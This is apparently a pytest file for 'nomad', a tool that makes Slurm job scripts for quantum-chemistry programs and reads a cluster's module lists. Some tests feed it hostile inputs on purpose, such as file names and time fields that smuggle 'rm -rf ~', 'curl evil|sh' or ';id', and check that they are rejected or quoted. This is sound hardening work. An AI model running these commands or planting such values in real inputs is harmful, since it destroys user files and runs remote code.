"""1.26.0: a job script made for someone who has none, from a program's
template (spydur's and arachne's modules, as their clusters list them) or
from a past script of theirs."""
import subprocess
from datetime import datetime

import pytest

from nomad.submit import templates as T

GAUSSIAN = {"program": "Gaussian", "sites": ["spydur", "arachne"], "modules": ["gaussian/*"],
            "default": "gaussian/latest", "inputs": [".gjf", ".com"],
            "setup": ["export GAUSS_SCRDIR={scratch}", "mkdir -p {scratch}"],
            "run": "g16 < {input} > {stem}.log", "after": ["rm -rf {scratch}"], "outputs": ["{stem}.log"],
            "cpus": 8, "mem": "16G", "time": "1-00:00:00",
            "run_for": {"gaussian/g09*": "g09 < {input} > {stem}.log"}}
COLUMBUS = {"program": "Columbus", "sites": ["spydur"], "modules": ["columbus/*"], "default": "columbus/722",
            "folder": "control.run", "run": "$COLUMBUS/runc -m {mem_mb} -nproc {cpus} > runls 2>&1",
            "cpus": 4, "mem": "8G", "time": "2-00:00:00", "parallel": "mpi"}
QCHEM = {"program": "Q-Chem", "modules": ["qchem/*"], "inputs": [".in", ".inp"],
         "run": "qchem -nt {cpus} {input} {stem}.out", "outputs": ["{stem}.out"]}
# what spydur's `module -t avail` gives (with /usr/local/sw/modulefiles), 4 Nov 2026
SPYDUR = ["columbus/", "columbus/7-2013-02-04p", "columbus/7-2017-12-07", "columbus/722", "columbus/722.bak-20260630",
          "columbus/columbus", "columbus/columbus701", "gaussian/", "gaussian/g16", "gaussian/g16c02",
          "gaussian/latest", "gromacs/2026.2-gpu", "qchem/qchem", "qchem/qchem521", "qchem/qchem54",
          "qchem/qchem611"]


def test_a_template_is_checked_and_bad_ones_are_said():
    t = T.template(GAUSSIAN)
    assert t.program == "Gaussian" and t.offered_at("spydur") and not t.offered_at("vadur")
    for bad, said in (({"run": "g16 < {inpt}"}, "isn't a place nomad fills"),
                      ({"run": "a\nb"}, "one line"),
                      ({"inputs": ["gjf"]}, "file endings"),
                      ({"folder": "control.run"}, "one of them"),
                      ({"mem": "lots"}, "isn't a size"),
                      ({"partition": "a b"}, "partition's name"),
                      ({"parallel": "openmp"}, "threads")):
        with pytest.raises(T.TemplateError, match=said):
            T.template(dict(GAUSSIAN, **bad))
    got, problems = T.templates({"submit": {"templates": [GAUSSIAN, dict(GAUSSIAN, mem="x"), COLUMBUS,
                                                          dict(COLUMBUS, cpus=2)]}}, "spydur")
    assert [t.program for t in got] == ["Gaussian", "Columbus"]
    assert any("#2" in p and "isn't a size" in p for p in problems) and any("two templates for Columbus" in p
                                                                             for p in problems)
    assert [t.program for t in T.templates({"submit": {"templates": [GAUSSIAN, COLUMBUS]}}, "arachne")[0]] == \
        ["Gaussian"]


def test_versions_from_what_the_cluster_has():
    g = T.template(GAUSSIAN)
    names, first = T.versions(g, SPYDUR)
    assert names == ["gaussian/latest", "gaussian/g16", "gaussian/g16c02"] and first == "gaussian/latest"
    c = T.template(COLUMBUS)
    names, first = T.versions(c, SPYDUR)
    assert "columbus/722.bak-20260630" not in names and "columbus/" not in names
    assert first == "columbus/722"
    # no default of the template's there: one the cluster marks, else the newest
    q = T.template(dict(GAUSSIAN, program="Q-Chem", modules=["qchem/qchem*"], default="qchem/qchem700"))
    assert T.versions(q, SPYDUR)[1] == "qchem/qchem611"
    assert T.versions(q, ["qchem/qchem54", ("qchem/qchem521", True)])[1] == "qchem/qchem521"
    assert T.versions(q, []) == ([], None)
    assert T.run_line(g, "gaussian/g09d01") == "g09 < {input} > {stem}.log"


def test_the_script_from_a_template():
    g = T.template(GAUSSIAN)
    text = T.render(g, module="gaussian/g16c02", input_path="/home/ab/runs/water dimer.gjf", cpus=4,
                    site={"module_paths": ["/usr/local/sw/modulefiles"], "scratch": "/scratch/$USER/$SLURM_JOB_ID"},
                    when=datetime(2026, 11, 4))
    lines = text.splitlines()
    assert lines[:6] == ["#!/bin/bash", "#SBATCH --job-name=water_dimer", "#SBATCH --cpus-per-task=4",
                         "#SBATCH --mem=16G", "#SBATCH --time=1-00:00:00", "#SBATCH --output=water_dimer-%j.out"]
    assert "cd /home/ab/runs || exit 1" in lines
    assert lines.index("module use /usr/local/sw/modulefiles") < lines.index("module load gaussian/g16c02 || exit 1")
    assert 'export GAUSS_SCRDIR="/scratch/$USER/$SLURM_JOB_ID"' in lines
    assert "g16 < 'water dimer.gjf' > 'water dimer'.log" in lines          # quoted for the shell
    assert lines[-3:] == ["status=$?", 'rm -rf "/scratch/$USER/$SLURM_JOB_ID"', "exit $status"]
    assert T.script_name(g, "/home/ab/runs/water dimer.gjf") == "/home/ab/runs/water_dimer.sh"
    assert T.outputs(g, "/home/ab/runs/water dimer.gjf") == ["water dimer.log"]
    with pytest.raises(T.TemplateError, match="isn't a Gaussian input"):
        T.render(g, module="gaussian/g16", input_path="/home/ab/water.xyz")
    with pytest.raises(T.TemplateError, match="isn't one of"):
        T.render(g, module="qchem/qchem611", input_path="/home/ab/water.gjf")
    with pytest.raises(T.TemplateError, match="isn't one of"):
        T.render(g, module="gaussian/*", input_path="/home/ab/water.gjf")
    # a hostile file name stays one word in every command
    import shlex
    bad = "x'; rm -rf ~; '.gjf"
    text = T.render(g, module="gaussian/g16", input_path="/home/ab/" + bad)
    run = next(x for x in text.splitlines() if x.startswith("g16 "))
    assert shlex.split(run) == ["g16", "<", bad, ">", "x'; rm -rf ~; '.log"]
    with pytest.raises(T.TemplateError, match="control characters"):
        T.render(g, module="gaussian/g16", input_path="/home/ab/a\nb.gjf")


def test_a_folder_of_inputs_and_mpi():
    c = T.template(COLUMBUS)
    text = T.render(c, module="columbus/722", input_path="/scratch/ab/ethylene/", mem="16G",
                    site={"module_paths": ["/usr/local/sw/modulefiles"]})
    assert "#SBATCH --ntasks=4" in text and "#SBATCH --nodes=1" in text
    assert "cd /scratch/ab/ethylene || exit 1" in text
    assert "$COLUMBUS/runc -m 16384 -nproc ${SLURM_NTASKS:-4} > runls 2>&1" in text
    assert T.script_name(c, "/scratch/ab/ethylene") == "/scratch/ab/ethylene/run.sh"


def test_a_past_script_for_another_input():
    past = ("#!/bin/bash\n#SBATCH -J h2o\n#SBATCH --mem=8G\nmodule load gaussian/g16\n"
            "# h2o.gjf was the first\ng16 < h2o.gjf > h2o.log\ncp h2o.chk ~/keep/\necho done h2oX.gjf\n")
    text, changed = T.swap_input(past, "/home/ab/h2o.gjf", "/home/ab/water.gjf")
    assert "#SBATCH -J water" in text and "g16 < water.gjf > water.log" in text and "cp water.chk ~/keep/" in text
    assert "# h2o.gjf was the first" in text and "h2oX.gjf" in text          # comments and other words kept
    assert [c["line"] for c in changed] == [2, 6, 7]
    with pytest.raises(T.TemplateError, match="isn't named"):
        T.swap_input(past, "/home/ab/other.gjf", "/home/ab/water.gjf")


def test_the_modules_a_cluster_lists(tmp_path, monkeypatch):
    import sqlite3
    import subprocess
    from nomad.collectors import modules as M
    # Lmod's terse list (arachne's, 4 Nov 2026, with a header and marks as other versions print them)
    out = ("/usr/local/sw/modulefiles:\ngaussian/\ngaussian/g16\ngaussian/g16c02\ngaussian/latest(default)\n"
           "vasp/\nvasp/6.5.1\nvasp/6.6.0 <L>\nqchem/qchem611(D)\n\n")
    assert M.parse(out) == [("gaussian/g16", False), ("gaussian/g16c02", False), ("gaussian/latest", True),
                            ("vasp/6.5.1", False), ("vasp/6.6.0", False), ("qchem/qchem611", True)]
    seen = []
    mp = tmp_path / "modulefiles"
    mp.mkdir()
    out = out.replace("/usr/local/sw/modulefiles:", f"{mp}:")
    real_run = subprocess.run
    rc = {"avail": 0}

    def run(argv, **kw):
        # the script as a login would run it, with a module function as Lmod's (its list on stderr)
        seen.append(argv)
        fake = ('echo "Welcome to the cluster"; WARNING=1; '
                'module() { case "$1" in use) [ -d "$2" ] ;; -t) printf "%s" "$LIST" >&2; return $RC ;; esac; }; ')
        return real_run(["bash", "-c", fake + argv[2]], capture_output=True, text=True, timeout=30,
                        env={"PATH": "/usr/bin:/bin", "LIST": out, "RC": str(rc["avail"])})
    monkeypatch.setattr(M.subprocess, "run", run)
    c = M.ModulesCollector({"module_paths": [str(mp), "bad path; rm"]}, tmp_path / "db")
    data = c.collect()
    c.store(data)
    assert seen[0][:2] == ["bash", "-lc"] and f"module use {mp}" in seen[0][2]
    assert "rm" not in seen[0][2].replace("__NOMAD", "")
    assert "Welcome" not in [d["module"] for d in data]
    conn = sqlite3.connect(tmp_path / "db")
    assert M.available(conn)[:2] == [("gaussian/g16", False), ("gaussian/g16c02", False)]
    assert c.collect() == [] and "less than" in c.note          # once a day
    # a version gone, one new: only those rows change
    out = out.replace("vasp/6.5.1\n", "vasp/6.7.0\n")
    c.min_hours = 0
    c.store(c.collect())
    names = [m for m, _d in M.available(conn)]
    assert "vasp/6.7.0" in names and "vasp/6.5.1" not in names
    # templates pick from it
    g = T.template(GAUSSIAN)
    assert T.versions(g, M.available(conn)) == (["gaussian/latest", "gaussian/g16", "gaussian/g16c02"],
                                                "gaussian/latest")


def test_nomad_templates_shows_and_makes(tmp_path):
    import sqlite3
    from click.testing import CliRunner
    from nomad.cli import cli
    from nomad.collectors import modules as M
    db = tmp_path / "combined.db"
    conn = sqlite3.connect(db)
    conn.executescript(M.ModulesCollector.SCHEMA.replace("module TEXT PRIMARY KEY", "module TEXT"))
    conn.execute("ALTER TABLE modules_available ADD COLUMN source_site TEXT")
    for m in SPYDUR:
        conn.execute("INSERT INTO modules_available (module, is_default, source_site) VALUES (?, 0, 'spydur')", (m,))
    conn.execute("INSERT INTO modules_available (module, is_default, source_site) VALUES ('vasp/6.6.0', 0, 'arachne')")
    conn.commit()
    toml = tmp_path / "nomad.toml"
    toml.write_text("""
[submit.build.spydur]
module_paths = ["/usr/local/sw/modulefiles"]

[[submit.templates]]
program = "Gaussian"
modules = ["gaussian/*"]
default = "gaussian/latest"
inputs = [".gjf", ".com"]
run = "g16 < {input} > {stem}.log"
cpus = 8
mem = "16G"
time = "1-00:00:00"

[[submit.templates]]
program = "VASP"
sites = ["spydur"]
modules = ["vasp/*"]
folder = "INCAR"
run = "mpirun -np {gpus} vasp_std"
gpus = 1
""")
    r = CliRunner().invoke(cli, ["-c", str(toml), "templates", "--site", "spydur", "--db", str(db), "--hub"])
    assert r.exit_code == 0, r.output
    assert "versions: gaussian/latest, gaussian/g16, gaussian/g16c02  (first: gaussian/latest)" in r.output
    assert "! VASP: none of vasp/* is among spydur's modules" in r.output
    r = CliRunner().invoke(cli, ["-c", str(toml), "templates", "--site", "spydur", "--db", str(db), "--hub",
                                 "--make", "gaussian", "--input", "/home/ab/water.gjf"])
    assert r.exit_code == 0, r.output
    assert "# would be saved as /home/ab/water.sh" in r.output and "module load gaussian/latest || exit 1" in r.output
    r = CliRunner().invoke(cli, ["-c", str(toml), "templates", "--site", "spydur", "--db", str(db), "--hub",
                                 "--make", "gaussian", "--input", "/home/ab/water.gjf", "--module", "gaussian/g09"])
    assert r.exit_code != 0 and "isn't one of spydur's Gaussian modules" in r.output


# ── review of 1.26.0 ───────────────────────────────────────────────────────

def test_no_control_character_or_line_separator_reaches_the_script():
    g = T.template(GAUSSIAN)
    for bad in ("/home/ab/x\rcurl evil|sh #.gjf", "/home/ab/x\x00.gjf", "/home/ab/x\u2028y.gjf",
                "/home/ab/x\u202ey.gjf", "/home/ab/x\x85y.gjf", "/home/ab/../cd/x.gjf", "/home/./ab/x.gjf"):
        with pytest.raises(T.TemplateError, match="control characters"):
            T.render(g, module="gaussian/g16", input_path=bad)
    # a folder template too, with the comment line quoted
    c = T.template(COLUMBUS)
    with pytest.raises(T.TemplateError):
        T.render(c, module="columbus/722", input_path="/scratch/lab/x\rcurl evil|sh #")
    text = T.render(c, module="columbus/722", input_path="/scratch/lab/eth ylene")
    assert "for 'eth ylene'." in text


def test_a_script_with_a_scratch_folder_runs_only_under_slurm():
    g = T.template(GAUSSIAN)
    text = T.render(g, module="gaussian/g16", input_path="/home/ab/water.gjf",
                    site={"scratch": "/scratch/$USER/$SLURM_JOB_ID"})
    lines = text.splitlines()
    guard = next(i for i, x in enumerate(lines) if x.startswith('if [ -z "${SLURM_JOB_ID:-}" ]'))
    assert guard < lines.index("cd /home/ab || exit 1") < lines.index('rm -rf "/scratch/$USER/$SLURM_JOB_ID"')
    r = subprocess.run(["bash", "-c", text], capture_output=True, text=True, env={"PATH": "/usr/bin:/bin"})
    assert r.returncode != 0 and "send this with sbatch" in r.stderr
    # without {scratch}: no guard
    q = T.template(QCHEM)
    assert "SLURM_JOB_ID" not in T.render(q, module="qchem/qchem611", input_path="/home/ab/w.in")


def test_the_guard_holds_when_the_script_is_sourced_and_scratch_names_the_job(tmp_path):
    """Second review: a sourced script went on past ${SLURM_JOB_ID:?}; a site scratch without the
    job's id made every job's rm -rf take the person's whole scratch."""
    (tmp_path / "s").mkdir()
    (tmp_path / "s" / "keep").write_text("mine")
    g = T.template(GAUSSIAN)
    text = T.render(g, module="gaussian/g16", input_path=f"{tmp_path}/w.gjf",
                    site={"scratch": f"{tmp_path}/s/$SLURM_JOB_ID"})
    script = tmp_path / "w.sh"
    # as if it expanded empty, and with a module command (so nothing stops it but the guard)
    script.write_text(text.replace("/s/$SLURM_JOB_ID", "/s/${SLURM_JOB_ID:-}")
                      .replace("#!/bin/bash\n", "#!/bin/bash\nmodule() { :; }\n", 1))
    for how in (["bash", str(script)], ["sh", str(script)], ["bash", "-c", f". {script}; echo went on"],
                ["bash", "-i", "-c", f"source {script}; echo went on"]):
        subprocess.run(how, capture_output=True, text=True, env={"PATH": "/usr/bin:/bin", "HOME": str(tmp_path)},
                       stdin=subprocess.DEVNULL, timeout=30)
        assert (tmp_path / "s" / "keep").exists(), how
    for bad in ("/scratch/$USER", "/scratch/${USER}/tmp", "relative/$SLURM_JOB_ID"):
        got = T.site_settings({"submit": {"build": {"s": {"scratch": bad}}}}, "s")
        assert got["scratch"] is None and "must be a full path naming the job" in got["problems"][0]
    ok = T.site_settings({"submit": {"build": {"s": {"scratch": "/scratch/${USER}/${SLURM_JOB_ID}"}}}}, "s")
    assert ok["scratch"] == "/scratch/${USER}/${SLURM_JOB_ID}" and not ok["problems"]
    got = T.site_settings({"submit": {"build": {"s": {"module_paths": ["/home/$USER/mods", "/usr/local/sw/modulefiles"]}}}},
                          "s")
    assert got["module_paths"] == ["/usr/local/sw/modulefiles"] and "no $" in got["problems"][0]
    offered = T.offer({"submit": {"build": {"s": {"scratch": "/scratch/$USER"}}, "templates": [GAUSSIAN]}}, "s",
                      ["gaussian/g16"])
    assert any("must be a full path naming the job" in x for x in offered["problems"])
    # the last part of a path too; and a time of 0 is no limit at all: refused
    with pytest.raises(T.TemplateError, match="control characters"):
        T.render(T.template(COLUMBUS), module="columbus/722", input_path="/home/amy/runs/..")
    with pytest.raises(T.TemplateError, match="isn't a time"):
        T.render(g, module="gaussian/g16", input_path="/home/ab/w.gjf", time="0")
    with pytest.raises(T.TemplateError, match="isn't a time"):
        T.template(dict(GAUSSIAN, time="0"))


def test_two_folders_with_the_same_names_both_count(tmp_path):
    from nomad.collectors import modules as M
    entries, folders = M._scan("/B:\nx/1\n/A:\nx/1\n")
    assert entries == [("x/1", False)] and folders == {"/A", "/B"}


def test_names_like_options_endings_any_case_and_folder_outputs():
    q = T.template(QCHEM)
    text = T.render(q, module="qchem/qchem611", input_path="/home/ab/--help.in")
    run = next(x for x in text.splitlines() if x.startswith("qchem "))
    assert run.split()[3:] == ["./--help.in", "./--help.out"]
    assert T.render(T.template(GAUSSIAN), module="gaussian/g16", input_path="/home/ab/WATER.GJF")
    c = T.template(COLUMBUS)
    assert T.outputs(T.template(dict(COLUMBUS, outputs=["runls"])), "/home/ab/ethylene") == ["runls"]
    folder_out = dict(COLUMBUS, outputs=["{input}.log", "{stem}.out"])
    assert T.outputs(T.template(folder_out), "/home/ab/ethylene") == ["control.run.log", "ethylene.out"]


def test_time_is_slurm_s_form_on_one_line():
    g = T.template(GAUSSIAN)
    for bad in ("60\nrm -rf ~", "1 day", "1:00:00;id"):
        with pytest.raises(T.TemplateError, match="isn't a time"):
            T.render(g, module="gaussian/g16", input_path="/home/ab/w.gjf", time=bad)
    assert "#SBATCH --time=2:00:00" in T.render(g, module="gaussian/g16", input_path="/home/ab/w.gjf",
                                               time=" 2:00:00 ").splitlines()
    assert "#SBATCH --time=60" in T.render(g, module="gaussian/g16", input_path="/home/ab/w.gjf",
                                          time="60\n").splitlines()          # written as Slurm reads it
    with pytest.raises(T.TemplateError, match="isn't a time"):
        T.template(dict(GAUSSIAN, time="1-00:00:00\nrm"))


def test_a_past_script_takes_only_a_name_the_shell_keeps_as_it_is():
    old = "#!/bin/bash\n#SBATCH --job-name=h2o\ng16 < h2o.gjf > h2o.log\n"
    for bad in ("a;rm -rf ~;b.gjf", "a b.gjf", "-x.gjf", "a'b.gjf"):
        with pytest.raises(T.TemplateError, match="needs quoting"):
            T.swap_input(old, "/home/ab/h2o.gjf", "/home/ab/" + bad)
    text, _ = T.swap_input(old, "/home/ab/h2o.gjf", "/home/ab/water.gjf")
    assert "g16 < water.gjf > water.log" in text


def test_a_failed_read_keeps_the_modules_read_before(tmp_path, monkeypatch):
    """Review of 1.26.0: the folder away (NFS), module use or avail failing, or a folder that gave
    nothing is an error, never "the cluster has none of those any more"."""
    import sqlite3
    from nomad.collectors import modules as M
    from nomad.collectors.base import CollectionError
    mp = tmp_path / "modulefiles"
    mp.mkdir()
    state = {"list": f"/usr/share/modulefiles:\ncmake/3.20\n{mp}:\ngaussian/g16\n", "rc": 0}
    real_run = subprocess.run

    def run(argv, **kw):
        fake = 'module() { case "$1" in use) [ -d "$2" ] ;; -t) printf "%s" "$LIST" >&2; return $RC ;; esac; }; '
        return real_run(["bash", "-c", fake + argv[2]], capture_output=True, text=True, timeout=30,
                        env={"PATH": "/usr/bin:/bin", "LIST": state["list"], "RC": str(state["rc"])})
    monkeypatch.setattr(M.subprocess, "run", run)
    c = M.ModulesCollector({"module_paths": [str(mp)], "min_hours": 0}, tmp_path / "db")
    c.store(c.collect())
    conn = sqlite3.connect(tmp_path / "db")
    assert [m for m, _d in M.available(conn)] == ["cmake/3.20", "gaussian/g16"]
    state["list"] = "/usr/share/modulefiles:\ncmake/3.20\n"          # the folder's modules didn't come
    with pytest.raises(CollectionError, match="no modules from"):
        c.collect()
    state["list"], state["rc"] = f"/usr/share/modulefiles:\ncmake/3.20\n{mp}:\ngaussian/g16\n", 1
    with pytest.raises(CollectionError, match="exit 1"):
        c.collect()
    state["rc"] = 0
    mp.rmdir()
    with pytest.raises(CollectionError, match="isn't there now"):
        c.collect()
    assert [m for m, _d in M.available(conn)] == ["cmake/3.20", "gaussian/g16"]


def test_environment_modules_marks():
    from nomad.collectors import modules as M
    out = ("/etc/modulefiles:\ngaussian/g16c02(default:stable)\ngaussian/g09d01(g09)\nbaz/2.0 <nearly-forbidden>\n"
           "orca/orca(D,L)\n")
    assert M.parse(out) == [("gaussian/g16c02", True), ("gaussian/g09d01", False), ("baz/2.0", False),
                            ("orca/orca", True)]
